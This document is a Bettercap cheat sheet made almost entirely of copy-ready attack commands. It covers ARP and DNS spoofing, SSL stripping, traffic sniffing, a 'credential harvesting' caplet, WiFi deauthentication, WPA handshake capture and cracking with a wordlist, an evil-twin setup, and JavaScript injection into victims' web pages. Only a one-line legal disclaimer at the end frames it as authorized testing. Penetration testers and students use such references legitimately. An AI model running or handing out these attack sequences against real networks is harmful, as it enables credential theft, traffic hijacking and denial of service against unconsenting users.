# Bettercap Quick Reference Cheat Sheet

## Table of Contents
- [Installation](#installation)
- [Basic Commands](#basic-commands)
- [Network MITM](#network-mitm)
- [WiFi Attacks](#wifi-attacks)
- [Useful Caplets](#useful-caplets)
- [Common Scenarios](#common-scenarios)

---

## Installation

```bash
# Debian/Ubuntu/Kali
sudo apt install bettercap

# Update caplets and UI
sudo bettercap -eval "caplets.update; ui.update; quit"

# Verify installation
bettercap -version
```

---

## Basic Commands

### Starting Bettercap

```bash
# Interactive mode
sudo bettercap

# Specify interface
sudo bettercap -iface eth0

# Run with caplet
sudo bettercap -caplet http-ui

# Execute commands directly
sudo bettercap -eval "net.probe on; net.show"
```

### Core Commands

```bash
# Help
help
help <module>
help modules

# Show discovered hosts
net.show

# Network discovery
net.probe on

# Active reconnaissance
net.recon on

# Exit
quit
```

### Settings

```bash
# View all settings
get *

# View specific setting
get arp.spoof.targets

# Set value
set arp.spoof.targets 192.168.1.50

# View interface
get iface
```

---

## Network MITM

### Prerequisites

```bash
# Enable IP forwarding (required!)
sudo sysctl -w net.ipv4.ip_forward=1

# Make permanent
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
```

### ARP Spoofing

```bash
# Basic ARP spoof (single target)
set arp.spoof.targets 192.168.1.50
set arp.spoof.fullduplex true
arp.spoof on

# Multiple targets
set arp.spoof.targets 192.168.1.50,192.168.1.51

# Entire subnet
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# Stop spoofing
arp.spoof off

# View current settings
arp.spoof
```

### Traffic Sniffing

```bash
# Basic sniffing
net.sniff on

# Sniff with filter (HTTP only)
set net.sniff.filter "tcp port 80"
net.sniff on

# Verbose output
set net.sniff.verbose true

# Save to pcap
set net.sniff.output /tmp/capture.pcap
net.sniff on

# Stop sniffing
net.sniff off
```

### DNS Spoofing

```bash
# Spoof single domain
set dns.spoof.domains example.com
set dns.spoof.address 192.168.1.100
dns.spoof on

# Spoof multiple domains
set dns.spoof.domains facebook.com,google.com
dns.spoof on

# Spoof all domains (wildcard)
set dns.spoof.all true
set dns.spoof.address 192.168.1.100
dns.spoof on

# Custom hosts file
set dns.spoof.hosts /path/to/hosts.txt
dns.spoof on

# Stop DNS spoofing
dns.spoof off
```

### HTTP/HTTPS Proxy

```bash
# HTTP proxy with SSL strip
set http.proxy.sslstrip true
http.proxy on

# HTTPS proxy
set https.proxy.sslstrip true
https.proxy on

# Custom proxy script
set http.proxy.script /path/to/script.js
http.proxy on

# Verbose logging
set http.proxy.verbose true
set https.proxy.verbose true

# Stop proxy
http.proxy off
https.proxy off
```

### Complete MITM Attack

```bash
# 1. Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# 2. Start bettercap
sudo bettercap -iface eth0

# 3. Network discovery
net.probe on

# 4. View targets
net.show

# 5. ARP spoof
set arp.spoof.targets 192.168.1.50
arp.spoof on

# 6. SSL strip
set http.proxy.sslstrip true
http.proxy on

# 7. Sniff traffic
set net.sniff.verbose true
net.sniff on
```

---

## WiFi Attacks

### Monitor Mode Setup

```bash
# Using airmon-ng
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Manual
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Disable monitor mode
sudo airmon-ng stop wlan0mon
# or
sudo iw dev wlan0 set type managed

# Verify
iwconfig wlan0
```

### WiFi Reconnaissance

```bash
# Start WiFi recon
wifi.recon on

# Channel hopping
set wifi.recon.channel_hopping true
wifi.recon on

# Specific channel
wifi.recon.channel 6

# Show APs
wifi.show

# Show clients
wifi.show.clients

# Show sorted by signal
wifi.show sort rssi

# Clear results
wifi.clear

# Stop recon
wifi.recon off
```

### Deauthentication

```bash
# Deauth all clients from AP
wifi.deauth <AP-BSSID>

# Deauth specific client
wifi.deauth <AP-BSSID> <CLIENT-MAC>

# Set deauth interval (ms)
set wifi.deauth.interval 1000

# Broadcast deauth (all APs)
wifi.deauth broadcast
```

### Handshake Capture

```bash
# Set channel
wifi.recon.channel 6

# Start recon
wifi.recon on

# Set output file
set wifi.handshakes.file /tmp/handshakes.pcap

# Wait for clients, then deauth
wifi.deauth <AP-BSSID>

# Watch for: "wifi.client.handshake" message

# Verify capture
# Exit bettercap, then:
aircrack-ng /tmp/handshakes.pcap
```

### Complete WiFi Attack

```bash
# 1. Enable monitor mode
sudo airmon-ng start wlan0

# 2. Start bettercap
sudo bettercap -iface wlan0mon

# 3. Scan for networks
wifi.recon on

# 4. View networks
wifi.show

# 5. Target specific channel
wifi.recon.channel 6

# 6. Deauth to capture handshake
wifi.deauth AA:BB:CC:DD:EE:FF

# 7. Handshake saved to ~/bettercap-wifi-handshakes.pcap
```

---

## Useful Caplets

### HTTP UI Caplet

```bash
# Start web interface
sudo bettercap -caplet http-ui

# Access: http://127.0.0.1:80
# Username: user
# Password: pass
```

### Quick MITM Caplet

Create `quick-mitm.cap`:
```bash
set arp.spoof.targets 192.168.1.0/24
set arp.spoof.fullduplex true
arp.spoof on

set http.proxy.sslstrip true
http.proxy on

set net.sniff.verbose true
net.sniff on

net.probe on
```

Run: `sudo bettercap -caplet quick-mitm.cap`

### WiFi Handshake Caplet

Create `wifi-handshake.cap`:
```bash
set wifi.interface wlan0
wifi.recon.channel 6
set wifi.handshakes.file /tmp/handshakes.pcap

wifi.recon on

echo "Run: wifi.deauth <BSSID> to capture handshake"
```

Run: `sudo bettercap -caplet wifi-handshake.cap`

### Credential Harvesting Caplet

Create `harvest.cap`:
```bash
net.probe on

set arp.spoof.targets 192.168.1.0/24
arp.spoof on

set http.proxy.sslstrip true
http.proxy on

set net.sniff.verbose true
set net.sniff.output /tmp/harvest.pcap
net.sniff on

set events.stream.output /tmp/harvest.log
events.stream on
```

---

## Common Scenarios

### Scenario 1: Capture Credentials from Single Target

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo bettercap -iface eth0

net.probe on
net.show  # Find target IP

set arp.spoof.targets 192.168.1.50
arp.spoof on

set http.proxy.sslstrip true
http.proxy on

set net.sniff.verbose true
net.sniff on
```

### Scenario 2: DNS Spoof Entire Network

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo bettercap -iface eth0

set arp.spoof.targets 192.168.1.0/24
arp.spoof on

set dns.spoof.domains facebook.com
set dns.spoof.address 192.168.1.100
dns.spoof on

net.probe on
```

### Scenario 3: Capture WPA Handshake

```bash
sudo airmon-ng start wlan0
sudo bettercap -iface wlan0mon

wifi.recon on
wifi.show  # Note target BSSID and channel

wifi.recon.channel 6
wifi.deauth AA:BB:CC:DD:EE:FF

# Wait for handshake message
# Then crack:
# aircrack-ng -w rockyou.txt ~/bettercap-wifi-handshakes.pcap
```

### Scenario 4: Evil Twin Attack

```bash
# Terminal 1: Setup fake AP with hostapd
# (See full guide for hostapd.conf)
sudo hostapd hostapd.conf

# Terminal 2: DHCP server
sudo dnsmasq -C dnsmasq.conf

# Terminal 3: Deauth real AP
sudo bettercap -iface wlan1
wifi.recon on
wifi.deauth <REAL-AP-BSSID>
```

### Scenario 5: JavaScript Injection

Create `inject.js`:
```javascript
function onResponse(req, res) {
    var body = res.ReadBody();
    if(res.ContentType.indexOf("text/html") != -1) {
        body = body.replace("</body>",
            "<script>alert('Injected!');</script></body>");
        res.Body = body;
    }
}
```

Run:
```bash
sudo bettercap -iface eth0
set arp.spoof.targets 192.168.1.50
arp.spoof on
set http.proxy.script /path/to/inject.js
http.proxy on
```

---

## Filters and Expressions

### BPF Filters (for net.sniff)

```bash
# HTTP traffic
set net.sniff.filter "tcp port 80"

# HTTPS traffic
set net.sniff.filter "tcp port 443"

# HTTP or HTTPS
set net.sniff.filter "tcp port 80 or tcp port 443"

# DNS queries
set net.sniff.filter "udp port 53"

# FTP
set net.sniff.filter "tcp port 21"

# SSH
set net.sniff.filter "tcp port 22"

# Email protocols
set net.sniff.filter "tcp port 25 or tcp port 110 or tcp port 143"

# Exclude ARP
set net.sniff.filter "not arp"

# Specific host
set net.sniff.filter "host 192.168.1.50"

# Specific network
set net.sniff.filter "net 192.168.1.0/24"
```

---

## Logging and Output

### Event Logging

```bash
# Log to file
set events.stream.output /tmp/bettercap.log
events.stream on

# Stop logging
events.stream off

# Ignore specific events
events.ignore wifi.ap.new
events.ignore wifi.client.probe

# Clear ignore list
events.clear
```

### Session Recording

```bash
# Save all sniffed packets
set net.sniff.output /tmp/session.pcap

# Save WiFi handshakes
set wifi.handshakes.file /tmp/handshakes.pcap

# Custom event log
set events.stream.output /tmp/events.log
events.stream on
```

---

## Keyboard Shortcuts

### In Bettercap Interactive Shell

```
Ctrl+C    - Stop current running modules
Ctrl+D    - Exit bettercap
Ctrl+L    - Clear screen
Ctrl+R    - Search command history
Tab       - Auto-complete
↑/↓       - Command history
```

---

## Environment Variables

```bash
# Set custom caplets path
export CAPLETS_PATH=/path/to/caplets

# Set custom interface
export IFACE=eth0

# Run bettercap
sudo -E bettercap
```

---

## Advanced Commands

### API and REST

```bash
# Start REST API
api.rest on

# Set credentials
set api.rest.username admin
set api.rest.password newpass

# API endpoint (from another terminal)
curl -k https://localhost:8083/api/session -u admin:newpass
```

### Ticker (Auto-refresh)

```bash
# Auto-run command every N seconds
set ticker.commands "clear; net.show"
set ticker.period 5
ticker on

# Stop ticker
ticker off
```

### Custom Variables

```bash
# Set custom variable
set $target 192.168.1.50

# Use variable
set arp.spoof.targets $target
```

---

## Troubleshooting Quick Fixes

### MITM not working

```bash
# Check IP forwarding
cat /proc/sys/net/ipv4/ip_forward  # Should be 1
sudo sysctl -w net.ipv4.ip_forward=1

# Check iptables
sudo iptables -L -t nat

# Verify interface
get iface
```

### WiFi not scanning

```bash
# Verify monitor mode
iwconfig wlan0

# Re-enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Check with airodump-ng
sudo airodump-ng wlan0mon
```

### Handshake not capturing

```bash
# Ensure correct channel
wifi.recon.channel <channel>

# Deauth multiple times
wifi.deauth <BSSID>

# Verify with aircrack
aircrack-ng ~/bettercap-wifi-handshakes.pcap
```

### Deauth not working

```bash
# Check adapter supports injection
sudo aireplay-ng --test wlan0mon

# Try different adapter
# Some chipsets don't support injection

# Check if AP has 802.11w (MFP)
# Can't deauth if enabled
```

---

## File Locations

```bash
# Caplets directory
/usr/local/share/bettercap/caplets/

# Default handshake output
~/bettercap-wifi-handshakes.pcap

# Web UI files
/usr/local/share/bettercap/ui/

# CA certificate
/usr/local/share/bettercap/bettercap-ca.crt
/usr/local/share/bettercap/bettercap-ca.key
```

---

## Useful One-Liners

### Quick network scan
```bash
sudo bettercap -eval "net.probe on; sleep 10; net.show; quit"
```

### Capture traffic for 60 seconds
```bash
sudo bettercap -eval "set arp.spoof.targets 192.168.1.50; arp.spoof on; set net.sniff.output /tmp/cap.pcap; net.sniff on; sleep 60; quit"
```

### WiFi scan and exit
```bash
sudo bettercap -iface wlan0 -eval "wifi.recon on; sleep 30; wifi.show; quit"
```

### DNS spoof with logging
```bash
sudo bettercap -eval "set arp.spoof.targets 192.168.1.0/24; arp.spoof on; set dns.spoof.all true; set dns.spoof.address 192.168.1.100; dns.spoof on; set events.stream.output /tmp/dns.log; events.stream on"
```

---

## Quick Reference Card

### Essential Commands
| Command | Description |
|---------|-------------|
| `net.probe on` | Start network discovery |
| `net.show` | Show discovered hosts |
| `arp.spoof on` | Start ARP spoofing |
| `dns.spoof on` | Start DNS spoofing |
| `http.proxy on` | Start HTTP proxy |
| `net.sniff on` | Start packet sniffer |
| `wifi.recon on` | Start WiFi scanning |
| `wifi.deauth` | Deauth WiFi clients |
| `help` | Show help |
| `quit` | Exit |

### Essential Settings
| Setting | Example |
|---------|---------|
| `arp.spoof.targets` | `192.168.1.50` |
| `dns.spoof.domains` | `example.com` |
| `dns.spoof.address` | `192.168.1.100` |
| `http.proxy.sslstrip` | `true` |
| `net.sniff.output` | `/tmp/cap.pcap` |
| `wifi.recon.channel` | `6` |

---

## Resources

- **Documentation**: https://www.bettercap.org/usage/
- **GitHub**: https://github.com/bettercap/bettercap
- **Community**: https://community.bettercap.org/
- **Caplets Repo**: https://github.com/bettercap/caplets

---

## Complete Guides

For detailed tutorials, see:
- [Complete Installation Guide](BETTERCAP-COMPLETE-GUIDE.md)
- [MITM Attack Guide](BETTERCAP-MITM-GUIDE.md)
- [WiFi Pentesting Guide](BETTERCAP-WIFI-GUIDE.md)

---

**Last Updated**: November 2025
**Version**: 2.32.0+

---

## Legal Disclaimer

⚠️ Use bettercap only on networks you own or have written authorization to test. Unauthorized access is illegal.
